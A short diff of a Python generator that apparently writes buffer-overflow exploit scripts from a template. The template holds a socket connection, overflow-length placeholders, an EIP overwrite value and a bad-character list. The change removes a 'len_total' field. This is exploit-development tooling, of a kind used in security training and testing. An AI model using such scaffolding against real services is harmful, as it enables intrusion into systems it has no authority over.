@@ -248,7 +248,6 @@ import socket
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
-len_total    = {}      # Start at len_overflow and try out how much can be overwritten
 len_overflow = {}      # Use pattern_create.rb and pattern_offset.rb to find exact offset
 eip          = "B"*4     # Ignore for badchar detection
 badchars = (
@@ -276,7 +275,7 @@ print('Trying to send %s bytes buffer...' % (str(len(buffer))))
 try:
     s.connect(('{}', {}))
 '''.format(
-        length, length - 30, char, host, port
+        length, char, host, port
     )
 
     code_init = ""
